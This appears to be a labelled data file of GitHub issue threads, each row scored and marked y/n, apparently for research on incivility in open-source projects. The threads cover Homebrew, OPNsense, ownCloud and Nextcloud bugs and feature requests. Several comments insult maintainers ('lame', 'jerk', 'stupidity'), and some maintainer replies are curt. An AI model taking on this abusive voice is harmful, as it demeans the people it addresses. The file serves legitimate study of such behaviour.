-moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } } There's probably some extraneous code in there that isn't necessary, but I haven't gotten to the stage of my programming where I care about cleaning up redundancy. Hope that helps someone in the future. BTW, the reason I am using ""spain"" instead of ""span"" is because I didn't want any CSS that affects all classes with the name ""span"" to mess with these styles.  The format for two of those lines of code is wrong. They are supposed to be *width Guess I should have tried harder to find the way to input code on here, but I don't see any way of doing it...  Even after I told you you post huge chunks of code without proper formatting. Anyway this was about your bug report and I confirmed that bug! The issue is closed and this is not the place to get help for your personal stuff. Try stackoverflow or the BS IRC channel.  Thanks nextgenthemes, I'll follow your example and be a jerk who can't read code that isn't inserted in an inset gray box and post rude comments when someone tries to help others. Or maybe I should say it like this so you're unable to read it. .nextgenthemes { display jerk; readability none; response-mode uncalled-for; }  Keep the name-calling and attitude out of our issues, please. Folks are here to learn, get help, and report bugs. They're not here to see folks bicker among themselves‚Äîthat doesn't help anyone. @friend He's referring to the ""GitHub Flavored Markdown"" link directly above the comment field on the right. Click that and it will show you how to use Markdown so you can take advantage of code syntax highlighting. Alternatively, have a look here. @friend I appreciate you trying to help, but please do your best to avoid the attitude in the future. You may not have even meant it, but I hope you can see how easy it is for folks to take it one way or the other. It's tough communicating via text like this‚Äîtone and context are easy to miss. ",34,0,389,0,0,133,5,y,
brew/Homebrew/3859,0.19054206,Homebrew,brew,brew update is destructive linking python3 to python,2717,19,13,0.5,2,"I just did ""brew update"" which did the following ==&gt; Migrating python3 to python ==&gt; Unlinking python3 ==&gt; Unlinking python ==&gt; Moving python3 children ==&gt; Linking python I'm sure that python3 makes sense to use and is the future, but why is this change made without  prompting the user for input? This is potentially a breaking change that can affect systems. Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command?  This changed was announced in January  you need Python 2,  This changed was announced in January  you need Python 2,  Also please always, always read and fill out the issue template. It tells you to do so. No Homebrew change ever prompts the user for input.  Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? I'd love to know the answer to this as well. How should a user guard against unexpected breaking changes? And once broken, how should users proceed and get back to getting work done?  In progressing levels of effort (the lowest level of which would have been sufficient in this case)  read our blog posts through the RSS feed or our Twitter feed (or the front page of Hacker News where they normally end up) watch our repository and read pull requests that seem relevant to your organisation watch our repository and test pull requests that seem relevant to your organisation before they are merged create your own tap or fork of Homebrew/homebrew-core for formulae you wish to never be changed  That's on you to figure out. We're volunteers running a project that you're using to ""get work done"" i.e. make money. Our license clearly states we disclaim all warranties and the software is available as-is. Note, your organisation could consider donating money to our project which would provide more resources to make it easier for us to do additional automated testing.  And to be clear This is definitely a breaking change. That's why we gave you a month and a half's notice on our primary communication mechanisms (blog on our homepage, our Twitter) to adapt to this change. If you did not do so that's on you, not us, sorry.  @friend Would you like to explain your üëé or would you like to just demotivate the maintainers to this project through drive-by negativity?  I think you are coming off angry and arrogant in your replies to this.  I think this is an issue that should be handled, and the users helped, with less arrogance and negativity from your side as well.  I see no mention of breaking changes or remediation steps in that blog post. If said blog is the only communication mechanism for breaking changes, that failure to communicate is on you. ",10,5,81,0.4,0.1,47,6,y,
brew/Homebrew/3933,0.085121596,Homebrew,brew,Automatically maintain ~/.Brewfile,5531,61,36,0.666666667,2,"In the past, multiple people have requested that some kind of hooks functionality be added to Homebrew. This would unnecessarily complicate Homebrew in my opinion, but the rationale behind those requests has not been given adequate consideration IMO. Rather than a generic hooks system, I would like to propose that Homebrew maintains ~/.Brewfile and keeps it up to date whenever new taps, formula, or casks are installed. This is the primary reason for all of the previous hooks requests, and I think it's a pretty legitimate one. This would allow anyone tracking their dotfiles in version control to simply add ~/.Brewfile and commit it whenever it changes. Currently, the process to do this is a bit annoying, because after every brew command, I need to manually run . It works, but it's a kludge. I'm not sure that this is relevant to 90% of Homebrew users, but it also doesn't harm anyone that doesn't want the functionality. They can simply ignore the file. I would also argue that anyone that currently has this file in place is probably already manually running the aforementioned command manually, and would be grateful for the automation. I'm happy to implement this if a PR would be welcomed.  Homebrew has historically (and correctly in my opinion) never written any dotfiles. As you mention this is still possible with some manual work that I think is more desirable and could be wrapped with a script or function that calls  after each  run. Sorry but thanks.  I am not the first to suggest this, nor will I be the last. I really don't understand your rationale here, but would you be open to an opt-in approach via an environment variable or something? It's extremely unlikely that I'm going to write a script that wraps all of the brew commands and run  after some of them when it's a problem that could be very trivially solved in Homebrew itself.  Can you link to the other suggestions? Thanks! That's up to you.  Solving this in HB itself is less trivial than the alternative ‚ô† newbrew() {   brew ${@}   brew bundle dump --file=~/.Brewfile --force }  I found these four very quickly. Hard to track them down because of the repository changes, but note that you (@friend) mentioned in  that it had been requested a few times before, so this can't be news to you.   if you want to do it correctly. It's not necessary to dump the Brewfile after  for instance. Personally, I would rather not incur the 2 second penalty on every brew command. Yes, this can be solved outside of Homebrew, but why should it not be Homebrew's issue? It's a point of friction that can be solved with zero negative consequences.  Also trivial  Because it does not pass the ‚Äúrelevant to 90% of users‚Äù barrier. Adding a feature does not just mean writing the code. It means maintaining it (code) and supporting it (issues); dealing with every other thing that breaks because of it; and considering when weighing other features that may clash with it (even if in usability).  Yeah, I'm aware. I maintain a widely used project as well. IMO, it still doesn't make sense to make each individual user that is affected by this problem solve it individually, even if the method for doing so is easy.  It does make sense in the case where it's relatively easy to do so, users cannot currently agree on how this should behave and we have a very low number of requests proportional to Homebrew (or even s) users.  Another option have launchd run brew bundle dump for you once an hour and forget about this forever.  TIL kludgy workarounds are an acceptable substitute for 20 lines of well tested, widely used code. I seriously cannot understand that mindset. You have refused to add ways for users to extend Homebrew, and you have refused to add specific functionality that users would add in third party extensions if they were able. You have essentially mandated that kludgy workarounds are the only way to get this functionality, and that's really not a great situation. If that's the barrier, then reopen this issue and let users discuss it. Tweet it out and ask for feedback. People aren't going to see/engage with it if it's closed. I would argue that literally anyone using brew bundle would benefit from this feature, even if they haven't explicitly requested it.  @friend Please read, or re-read, our Code of Conduct and adjust your future communication accordingly.  Wrapping a Unix tool with a Unix shell script is an acceptable substitute for an unknown quantity or quality of unwritten code that would be used by a minority of Homebrew's users. Untrue. Users can use and build external commands which can be shared in taps (along with formulae). That's not how we run our issue tracker, run yours how you choose. I use, have contributed more to it than anyone else and have maintained longer than anyone else both this repo and Homebrew/homebrew-bundle. I've also rolled out Homebrew/homebrew-bundle to hundreds of developers in an organisation who use it daily and built tools on top of it used by many other organisations. I would not use this feature and most of the aforementioned folks would not either. Finally, I wish I'd listened to my gut earlier and, like @friend has done, pointed you to our Code of Conduct. Unfortunately you seem unable to conduct yourself in a polite fashion so I'm uninterested in continuing this conversation. I hope that we're able to work together on a PR or issue in future but please note that continued violations of our Code of Conduct will result you being blocked from the Homebrew organisation. ",31,15,168,0,0.333333333,104,4,y,
brew/Homebrew/5687,0.04283976,Homebrew,brew,Prompt to uninstall forumuae upon upgrade,1986,19,12,0.4375,1,"  A detailed description of the proposed feature The current behavior of  is to remove all other installed versions. If a package has previously been installed using  then  should not remove those. The motivation for the feature I'm no longer able to back down to  or reinstall it using  and the current version feels slower perceptually during the development workflow. I'm unable to debug. I also have  signified as the minimum required version for a design system I need to be able to quickly toggle back and forth between versions of this pre-1.0.0 software. How the feature would be relevant to at least 90% of Homebrew users Whatever happened to Pareto? What alternatives to the feature have been considered I could stop using using Homebrew and run the Docker container I created to build from source.   We do not support installing older versions. You can use  to add it to your own tap. That's not a design principle we're adopting. Please fill out the template in future. Again, this is not helpful language. It makes no difference to us whether you choose to use Homebrew or not use whatever is best for you. You may be interested in the  variable. Please ensure you read  in future before creating issues, thanks.  This could indeed be helpful. But I would expect 99.7 percent of developers don't want dependencies they expressly installed removed without a simple prompt for cleanup especially if Homebrew can't maintain historical packages and doesn't afford its users a method of recovery. P.s. Please work on your soft skills.  Please be nice with the maintainers, which work on this project on their free time. We all do our best. Watch your tone. Thanks!  You don't want that but you are incorrect that the vast majority want that. As @friend has pointed out watch your tone. You also need to read our code of conduct  will happily communicate in whatever way you choose on the issue tracker of your open source projects but you will have to operate how we wish here. ",10,6,44,0.25,0.25,39,2,y,
carbon/dawnlabs/245,0.035460065,dawnlabs,carbon,Does not accept any files or text in Palemoon browser,504,2,1,0.8,0," Expected Behavior Actual Behavior  Duplicate of #28  Running through closing issues all over the place but not actually fixing anything . What the heck do you think you are doing ? The questions are placed looking for fixes not closed stamps . Did they give you that stamp in Kindergarten?  ""Does not accept any files or text in Palemoon browser""  Hey @friend thanks for you comments. We haven't released our fix for Safari support, but I will test if on Palemoon and try and mimick that support there. ",1,0,12,0,0.2,17,2,y,
classic-bug-tracker/elysium-project/869,0.172984723,elysium-project,classic-bug-tracker,Dire Maul - Lasher loot broken,3179,34,8,0.391304348,1,"The Lasher's inside of Dire Maul seem to have had their loot tables recently broken.  This has happened before and was eventually fixed. Please look into this as currently the drop rates are non blizz-like.  I can confirm that this is indeed true, but I would like to add that the herb spawns are broken as well. I've only been getting 1 herb spawn per reset.  I can confirm this. This is not Blizz-like. Please fix. Thank you  Drops have been a lot less lately, few and far between.  I do remember when DM first came out the plants were changed from blizz like as the money influx coming from mages farming them was too much but that was a long time ago  Fixed. Wait for the server restart.  @friend do you wanna expand what you mean by fixed?  @friend  The lashers are still not dropping loot like they are supposed to. Many times out of 5 packs, one or none have loot.  Lol dude its been 1 day has a patch even happened yet p plz remember we arent a big team like less than a handful of people who are smart and do Dev stuff  still a problem, no loot from them, only sometimes a green. 0 herbs  Apologies for seeming inpatient. That was my misunderstanding.  I read the fix reply as it would go live at the next server reboot. We had one of those on Saturday. Thought that would cover it. Will wait for maintenance cycle.  Thank you for all your hard work and time you sink into this so we can be entertained. &lt;3  Yeah shenna should of probs used to other label which ill add on now  do we know when to expect the fix to be applied to live?  It can be hard to tell. There are a lot of issues ahead of this in priority. Remember to take breaks from playing WoW its not like farming gold all day is your job P  I usually farm DM weekdays while at work since being a system admin has slow days if you're maintaining your systems correctly with enough preventative maintenance. It is better than staring at system stat dashboards.  Off to YouTube I go I guess )  I would like to say though, that if this was an intentional loot table change to combat gold sellers it is disappointing.  A lot of us spent time leveling mage alts specifically to farm DM as it is one of the best known farming spots in a true blizz-like setting.  I can only hope that it will revert to blizz like eventually. Thanks for all of your updates and responses on this @friend - A little communication makes a world of difference.  Still have entire packs with no loot.   i started playing on elysium when my bf wanted to try it. But a quick google search. It looks like even older servers by elysium might of done this too  It can be hard to tell how well combating gold sellers works but the elysium project decided they needed to do something... maybe we need a staff bot that appears when a single mage enters DM E and shows the mage a randomized scramble image of letters and numbers the player has to say correctly ;p Cleaned up this page. If youre just saying its not working thats not useful.  By removing ways to get gold in game, you're literally encouraging people to buy gold.  Alrighty well nothing more needs to be done by me. Im unsubscribing and this thread will no longer be moderated. ",14,0,64,0.188405797,0.405797101,67,2,n,
contacts/nextcloud/986,0.037432939,nextcloud,contacts,Company Saved as Contact Name,6057,92,42,0.48,6,"Version 3.0.5 When creating a new contact in the webapp, it submits the contact company as the contact name.  When it syncs to my phone, it shows ""Company"" in the contact list.  The name isn't present.  GitMate.io thinks possibly related issues are  (Cant create or save contacts),  (Allow named contact events),  (Contact name displayed as ""New contact"" for contacts with only a number of enterprise name),  (Saved searches), and  (Contacts syncing over CardDav with MacOS contacts, show as company.).  Hello, this ia done on purpose! If you don't have a valid  property, the app will try to find the closest appropriate data to use (a  data is mandatory) So it will try to generate one by using the  property, if present, or fallback to using the  property )  So I enter ""Vets (Hemel)"" in the name and then ""Expert Care"" in the company.  It ignores the name I give and just shows the name as ""Expert Care"" on my phone as both the name and the company. I tried several samples, with ""name name"", ""name"", name name name"", and it always uses the company. The only way to get the name is to leave company blank.  What does the nextcloud's ui displays?  The webapp shows the correct detail in the contact list, and in the contact information.  I note on my phone that the name of the phone number type, such as Home, is preceded by a double quote.  Not sure if this is related to the field assignments.  Possibly related to #910  @friend I just removed the company ""Expert Care"" from the above example and the contact in ios updated to show the name ""Vets (Hemel)"". But.... now I have a random contact in the ios contact list under ""#"" which is the number for that contact.  Doesn't appear in the nexcloud list. Something isn't right with the generated vcards. The number here is for the contact Vets above   I will need this vcard so I can understand what's going on please )  If I open it in Outlook, the phone number is blank.  If I remove the quotes from TYPE=""WORK,VOICE"" it works fine.  Okay, I'm a bit confused here, what issue are we talking about? The tel parameter quotes? The FN field being filled with the ORG's content? The iOS not displaying the contact properly?  All of the above. If I put a company name, the number doesn't have a problem but the name does.  The ""home"" designation of a phone number shows a spurious double quote in ios. If I don't put a company name, the name is ok but the number then becomes its own contact. I can open multiple bug reports for each one, but I suspect they are all one in the same.  Let's tackle them one by one then. )  what about not having an org name? Does he phone displays properly? What about the nextcloud's ui? Is it behaving properly? Because then this is an iOS issue. If the vCard we generate is correct according to the standards, then iOS is just not following them confused     Almost.  Where it shows the phone number or email type (e.g. Home, Work), it actually shows in all capitals with a leading double quote (e.g. ""HOME, ""WORK).  This appears to work fine.   This wasn't an issue prior to the 3.0.3 (ish) update I believe.  It was working fine for a long time, then I did a new install on a new server and contacts wasn't quite right.  @friend where do you generate the .vcf file?  I'm going to try and fix it myself.  @friend is more info needed?  I've confirmed the vcf is erroneous in ios and Outlook.  Seems like a bug.  Sorry, this one slipped through ) Please post a screenshot of every vcf that failed and the associated vcf file. I need to have a proper visibility of what error/issue we have for each case. It's getting confusing for me with all those vcard example on every issues see_no_evil  @friend they're all the same as the example above.  The problem is with the quotation marks on the phone number type (e.g. ""work,voice"").  If I remove the quotes it works in ios and outlook. Something is applying tags wrongly and it's causing the vcf to be invalid. Let me open a new issue for this vcf error.  This one should stick to the problem of company name over taking the person's name.  @friend edited a contact on my phone and it wiped all the numbers for that contact.  Contact shows in the list in the app online, but no numbers. This app is now fundamentally broken, and there is a lack of reply from development, so I'm classing this as closed and moving to an alternative.  @friend I'm sad to hear that! Lots of development is pushed towards this app, but maybe not on this issue. There are a lot of requests or discussions, and not only on the contacts app. Different priorities and focus. This is still an open source project, anyone can contribute. Could you help and fix the issue maybe? That would be awesome!  @friend I would consider inability to edit contacts on a phone, names being incorrectly shown due to a feature attempt by devs, and incorrectly formatted vcf files as pretty fundamental and high priority. Unfortunately, I did ask questions to get me started above, but was ignored.  So I'm out.  Sure, I would too! Unfortunately I was not able to properly understand your issue. I'm sorry I was not able to provide the solution in the timeline you expected. I wish you a good day! Cheers, John  @friend we are a community-driven project, so sometimes replies or debugging issues can take some time. The more info you provide, the easier it is to reproduce and fix it. Please be mindful of that and keep a friendly tone according to our Code of Conduct  @friend a community I support with various bug reports and information, along with an attempt above to join it directly (as mentioned, was ignored). It's disappointing that only when I complain I get quick replies.  I have continuously responded and waited, only to be told that more info is needed after I indicate I'm done waiting - couldn't have said it sooner? I've been polite and as helpful as possible throughout.  If the frustration shows, I suggest consideration be given to the cause and not the outcome. I won't be replying again.  As above, I'm using another app outside of Nextcloud. ",13,1,252,0.24,0.28,174,18,y,
core/opnsense/2036,0.17442425,opnsense,core,What the hell did you mean here?,601,9,9,0.666666667,0,"ok, it's understood (for now). lol, wut? You've just said it will be bridged, but ok, what's next there? Assign what ""this"" interface? Create bridge where? And why would one need to assign an interface here if he's supposed to create bridge ""separately""? It will make sense to specify bridge then may be? ok, if it's purely OpenVPN option you'd better refer to it as it's given in OpenVPN docs. It would be less confusing after all. P. S. This is the thing why one should never use any ""panels"" for whatever. It's simple to get things done with primary tools then to get through all that addons-stuff ",7,4,34,0.333333333,0,18,6,y,
core/opnsense/2071,0.165723637,opnsense,core,How do you propose to specify NAT rules on bridges?,2754,36,35,0.833333333,1,"Yeah, you know ‚Äî those bridges that can be configured there interfaces_bridge.php What's worse ‚Äî you don't allow to specify voluntary interface names in NAT rule editor. That's again (another) proof that with the approach you've chosen it's way wiser to install BSD and do needed config manually.  It's true. We're not fond of the approach of how bridges are integrated. For that reason we do recommend hardware switches which do the job just nicely for very little money of need be. However, in the scope of this ticket, what can we do to help make the system in place a bit less cumbersome?  Nope, you can't replace bridges with anything external; such virtual bridges can be used as glue for VPNs and LAN interfaces and so on. What does original OS allow? It allows entering any interface name in PF rule set. And, BTW, that really does make sense cause not all interfaces exist all the time. Some of them can be sprung/ceased during uptime. So, at least this approach ""don't narrow allowed choice scope"" would help to mitigate  this and similar problems.  What is your use case? I'm terribly sorry for not being able to follow.  That's exactly the thing! ‚Äî Having hard coded values for option (interfaces choice in PF is an example) w/o giving users an ability to override them makes opnsense unable to follow.  Wait, are you questioning the GUI + config.xml approach now? I thought we were talking about bridges?  Ah, ok, we can't, because if we do that it won't be reproducible after config export + import.  We also did. As to my very case ‚Äî it's combining 2 network Ethernet LAN segments into a single one with VPN and bridging. But in fact I also mentioned it earlier   well, PF allows you to specify anything as NIC name. The rules with it just won't have any effect if it's non present at run time. But, well, ok, you can't. That's the thing why it's not wise to install opnsense instead of BSD. ;)  The design goal is to not let the user edit raw files to provide verification and validation of the setup. It's not a console-based BSD, that's true. It's also uncommon to ""glue"" VPNs as normally network segregation is a wanted security aspect.  You're typical ""we know better what users need"". But in fact you're too lame to realize it  proof  @friend be polite please, if OPNsense doesn't fit your needs, feel free to use any other product available..  Ok, can I help you with something else?  I never meant to be polite to stupidity  I guess that is a no then. ) Cheers, Franco  Sure. I made up my mind; I'm also letting others know what they would face if they would try using pfsense^W opnsense. ‚Äî Its lame developers won't allow you to achieve full potential of original opensource software they've combined into this very ergh project. ",14,6,109,0.083333333,0.083333333,91,7,y,
core/owncloud/17122,0.050210602,owncloud,core,Experimental apps are always shown,17545,173,88,0,3,"On my local copy of master, I did not tick the box to show experimental apps and yet I see all the apps I installed myself, labelled as experimental. The first step would be to fix the bug and respect the tick box when showing/hiding non-approved apps. In 8.2, it would be great if the system could differentiate between a corporate, private app which was installed in a specific, trusted folder and one coming from the app store.  Experimental apps only affect the one displayed in the categories from the appstore. ‚Äì Nothing is filtered on already installed or disabled applications as this will give a wrong expectation what actually is installed.  Then I think the wording of that setting should be changed. It's not about enabling experimental apps, but about listing the ones which are available through the app store.  @friend you might have an idea to get better UX on this one?  Well, you must have enabled experimental apps then before or installed apps locally. Which apps does this happen for?  It happens for all apps which were installed locally and which are not labelled as official. You can't have a tick box for ""Enable experimental apps"" and then still show them when it's disabled. Perhaps the description should be modified to ""List experimental apps from the app store"", but it might still be confusing if a user enables an experimental app, disables it, unticks the setting and still sees it listed in his ""Not enabled"" list, under ""Experimental applications ahead""...  For apps which are approved / official in the app store but you clone locally, the fix is at  ‚Äì please review ) In the other cases I think the behavior is correct.  OK, that fix will at least remove the label from official/approved apps, but we still need to either filter out experimental apps if the switch is disabled or rename the switch to make it clear that it's only about the app store.   Ah right! Ok so what we need to fix in this case is to not show experimental applications which are disabled, when the setting is not checked. (Sorry it took me so long to get it. ;) But when you checked ¬ªenable experimental apps¬´, then installed one, and then uncheck the setting again ‚Äì that app should still be listed and be installed of course. Only once you disable it should it be removed from the list. So @friend can you submit a pull request for this? )  I disagree with this one. From my PoV we should show even untrusted applications even if they are disabled since the code is technically still existent on the server. ‚Äì Either we change the wording or we leave it as-is (what I'd do) from my PoV. That local applications get an experimental rating if they don't have a rated OCS ID and no shipped tag is a whole other topic.  Maybe add a warning at the end of the list that experimental applications are not listed due to our preferences (something along those lines), just to make sure those apps are not forgotten?  Right, they still exist on the server. I don‚Äôt have strong design arguments either way so I think it‚Äôs fine to just keep it as it is. You installed stuff yourself after all, so it‚Äôs non-standard usage. If there‚Äôs massive confusion coming up, we can still change this. But for now I would say let‚Äôs keep it as it is. Ok @friend? (We‚Äôll see how it‚Äôs received with the 8.1 release.)  I think it wouldn't hurt to reword the title. The description needs to be rewritten anyway since it's not using proper English and is too aggressive.  Keep in mind this warning is for regular admins who don‚Äôt necessarily all know what they are doing on their small instances. So it‚Äôs ok to state that there are likely to be security issues etc.  True, but it's the pot calling the kettle black. I've lost more data through the use of core apps than with 3rd party apps ;). Some points could be softened as follows ""... have not been as thoroughly tested"" ""... could cause unwanted side effects"" You have to think about the feelings of app devs who've spent a lot of time working on their projects and whose apps are instantaneously categorized as something to avoid, when an app like  per example, which is alpha quality and under ""heavy development"" gets the ""approved"" rating.  One more reason to quickly introduce channels ( So that even approved apps can be filtered out, depending on their stability. And I think ""Experimental"" is the wrong adjective. ""Untested"" maybe?  @friend you are welcome to join the ownCloud apps review team! ) Join #owncloud-app-review The Mail app was approved because well, it was thoroughly tested by @friend, @friend and me ‚Äì so it‚Äôs basically design-, dev- and security-reviewed. Also, it‚Äôs in pretty wide use already and hasn‚Äôt eaten any emails. )  I would probably only have time to review apps once a month S and I don't think I would approve many apps as most use private APIs and/or are missing descriptions. Regarding mail, I was referring to the statement made on the project's page in the app store. It's a 0.1 release ""under heavy development"" which is exactly how the apps settings page describes experimental apps.  I think you have to be careful how you manage this side of things. I've already heard devs grumble about how their work is being treated and @friend is hoping to increase the number of apps tenfold. That requires happy devs )  As you know, the problem is always time. Any devs in particular who are unhappy about the state of app reviews? Then we should all get them into the app review team. )  I agree that the problem is time, but for something as sensitive as app reviews, I think this needs to be semi-professionally done. People need to be trained, there needs to be a security review, etc. or the approved status is meaningless.  oC names dev an approver Approver approves apps with backdoors (easy to implement and easy to miss unless trained) by mistake Users start to find their data on public forums App is removed, etc., but it's too late, the damage is done  But even with a thorough review process, apps slip through... Look at all the nasty apps which went through Apple's net and they take their sweet time to review apps. On top of that oC doesn't have a remote kill switch... I need to open an issue about that.  @friend I just had a chat with @friend about a related topic and was wondering what you think How about we explicitly ask devs to submit their apps for reviewing? That makes sure that these devs have some kind of commitment and we can be sure that they at least in some way are dedicated to maintaining their app. Then from us (@friend, me and others) they will get code-, security- and design-feedback for their app. And eventually they get approved. I think a call for reviewing like this allows us to focus a bit. Currently one big problem is also that we simply don‚Äôt know where to start with the app reviews. If we have a simple submission queue we can work through that more easily. cc @friend if there‚Äôs any promo we need to do there.  I think it absolutely makes sense. All mobile devs have to do it in order for their apps to even show in the app stores. It will also help with the communication side and devs will be happy to get feedback on their work. Don't underestimate the amount of work involved on the approving side though. You'll need to publish reasonable acceptance criteria and stick to it. Also, if you're committed to make the AppFramework the preferred way to develop apps, you should definitely introduce a label for it, just like BlackBerry did with their ""Built for BlackBerry"" label. It definitely helps making a first selection. I try to avoid all apps which don't use the framework as it's almost certain they use private APIs and will break sooner rather than later (+ I wont be able to fix them as easily)  @friend a few thoughts.   -&gt; what do you think? This should at least explain our goals ;-) I think even if you have only time to review an app once a month it would still rock if you were able to join the review team. yes, reviews should be done professionally, but we can't limit the reviewers to ownCloud employees, imho. we probably should set up a wiki page where people can easily add a link to their app as a first step in getting a review queue. That would work, yes? That is a barrier for those app developers without a github account but it's a start. and the risks you mention - well, as you say, this even happened to Apple. It is probably not really possible to fully prevent that but once we're target for hackers like that, ownCloud must be so popular we will be able to afford a big team of ppl who review apps ;-) with regards to the wording we have to find a balance between 'properly' scaring (warning) users about the risk of entirely unreviewed apps and being nice to developers. I think the best solution is to ensure that apps get reviewed promptly so the ones in the 'experimental' category really are that - experimental. I know, this is an hard-to-achieve ideal but as @friend points out - that is why we need help ;-)   Some thoughts about the documentation  Approved apps deemed "" to be stable for casual to normal use"" as opposed to be ready for serious use. What about if a MDM company creates a connector so that ownCloud can be used in their secure container and keeps it in their repo? ""minimum 5 ratings, average score 60/100 or better"". Unfortunately, I think the maths doesn't work here. Apps start at 50 and each click is worth 1 point. There is also an issue with how versioning works. 8.1 apps start at 50 again, so that might confuse users who see approved app with a rating of below 60 when the previous version was in the 70s or 80s. I like the notes about trust levels and audits. Gives a better idea of what is expected of devs to be approved ""warning shows for security/stability risks"" I still don't think it's a good idea. Name one mobile app store which labels its apps as possibly insecure or experimental, apart from the ones in the beta programmes. ""Apps can only use the public ownCloud API""  has to be modified to . The public API is not mature enough. An alternative could be to ask developers to request permission to use some APIs and approvers could use the list of well known methods which don't exist in the public space to vet apps. It would help guide devs into using the proper APIs in case they took the wrong approach and would help the core team better understand which APIs are missing. Why not force the use of the AppFramework for new apps? It would make things much easier to review. There are still a few typos left ;)  Regarding taking part in reviewing apps, I need to do a dry run to see if I can afford the time and if I would add any value to the process. I hate mailing lists, but it does make sense to ask for approval there. Maybe you should provide a template or a web submission form which would auto post to the list and all further communication would happen off list. The only reply to a list post should be that someone has been assigned to the task. After having read the publishing page, I feel better about the review process and the value of the approved label, but I still don't agree on the benefit of scaring away users. Show me another app store which treats its developers that way. If an app is approved by Apple, BlackBerry or Google, it's considered good enough to be of help to any user. Some apps may have a special ""verified"" label next the company name in some store so that you know you're getting the real thing, but it's usually not implied that they're superior. This is certainly not true of quite a few official oC apps which don't meet the criteria on that publishing page. If you get the man power, you could create a special Black label for official and approved apps which are of excellent quality. That could help users pick the superior Calendar, Tasks or Mail app instead of blindly trusting unmaintained ""official"" apps.  Won't happen. If something is missing app developers has to add new APIs to core but we won't approve apps that use the private API. There may be cases where we do accept excuses but this is not going to be the default and a ""should"" implies otherwise. - We should stay with the ""can"" here from my PoV. Mobile apps run sandboxed. We can't do this. Installing an ownCloud app really means ""all your data is going to be eaten"". There is a reason why we add a huge scary text. I mean we have no problem with giving 100 apps an approved rating as long as know that the developer is a somewhat trustworthy person and the app looks somewhat sane. But we should be scary. I'd go with something like ""should follow best practises, i.e. using the AppFramework and not deprecated APIs where possible"", but we should not make this an hard requirement. I mean if code works Fine. We can make it clear that using the AppFramework makes reviewing easier and thus makes us approve the app faster but we should not enforce the full technology stack. The latter part will be fixed with an upcoming AppStore update that @friend is working on. The same app in the appstore can then serve multiple versions.  upcoming AppStore update === will very likely be in 8.1  Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news )  Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news )  Which probably really means that the current public sharing API is not to be really expected to be widely used by third-party developers speak_no_evil Only with granting explicit permission.  Indeed, which means that 3rd party apps can't compete. Devs have to choose between getting their apps approved or give users what they want, leading to an unappealing app store littered with constrained and experimental apps dr_doom And that's a model you could follow, sort of. Get rid of the warning in the app store and add a warning which pops up when someone tries to enable an approved app. Would work with occ as well.  How about we get together and discuss this at the conf, see what we can improve. By that time we have had about 6-7 weeks of experience with it... I don't think this is, like, totally burning down, is it?  I think you should hold an open forum on these sort of issues, to try and get some feedback. You could also ask everyone to fill in a questionnaire since some people might not feel comfortable coming forward publicly.  well, we do mail to the ML and discuss it here ;-) That's about as much open forum as you can have here, I suppose. I'll also blog about this at some point soon. And there is the conference....  Let's see how the change is received by the community at large. If people are unhappy, you'll know -&gt; No growth/defection, Twitter rants, blog posts, etc. I think the first reaction is going to be devs trying to get approved in order to avoid the experimental label and that's a good thing if approval or rejection happens within a week. I still think a form is a good idea because you can link to the terms and people won't be able to ignore your criteria.  yes, a form might be a good idea. But I don't see much effort put in until the release, at least not by me - I've been crazy busy with promotion/marketing preparations for the release, writing my fingers blue, editing videos etc. And everybody else is busy fixing bugs. So, for now - and maybe that is a mistake, but it is what it is - this is where we stand. Also note that apps, right now, would simply not show up AT ALL if they weren't added to the app store. Users had to install them manually. So in that regard, this is a step forward for most apps. And yes, the idea is of course to motivate app developers to try and get their app from 'experimental' to 'approved' ;-)  No problem about the form, just an idea. Maybe do an annual survey with some prices when there is not a release or a conference to organise? ;) In my experience, surveys have to be short or the incentive large (a copy of the $2000 report, etc.)  This is fixed, eh? @friend ",98,19,536,0,0,313,17,n,
core/owncloud/24232,0.030318191,owncloud,core,Try and fix relationships with downstream,9836,135,71,0,4,"I'm a happy Debian and ownCloud user for a long time now. Today I saw the package being evicted from Debian's repo and I was sad. Digging a little bit around I arrive to things like #22691. In principle the PR is ok, bugs in software package by Debian should first be reported in Debian's BTS and the maintainer should decide whether is part of her patches or it should be forwarded upstream. At least that's how usually should work. Alas, this is not the first time upstream that has problems with bugs reported to things done downstream. I also understand, from what I read, that in this case downstream didn't properly communicate with the ownCloud community, but I don't think that alienating downstream is the best solution. I think a better approach is to apply a variant of Postel's law ""Be open in what you receive, and strict in what you send"". As the Debian maintainer said, 'we‚Äôre doing our best to offer it to our users'. One of the things that this implies, more or less, is that the maintainer will try to keep the upgrade path as smooth as possible. In general, Debian has a very good record on upgrade paths, and personally that's why I chose it. Unluckily I can't see the patch because the package has been removed, so I can't help in that particular case. I wish this kind of problems could be solved any time soon, and this is my way to try to make that happen. I appreciate Jos's mail, because it goes in the same direction. As an outsider to the particular problem but also as a developer of database based applications, wouldn't it be possible to apply each individual upgrade script from the original release all the way to the latest one?  @friend You could but each app has its own update scripts. It'd be possible, but it is just a huge amount of work to develop and test on all the databases and stuff ownCloud supports. You're also not unlikely to end up with special bugs that won't show up until you upgrade some day in the future, and they'll be impossible to debug by then. It is just very fragile. A proper solution would require a new updater technology that is more stand-alone and designed to do this - that was introduced in ownCloud 9.0 and might allow stuff like this later in the 9.x series, but bolting that on the older releases is a huge, complex task. The best solution 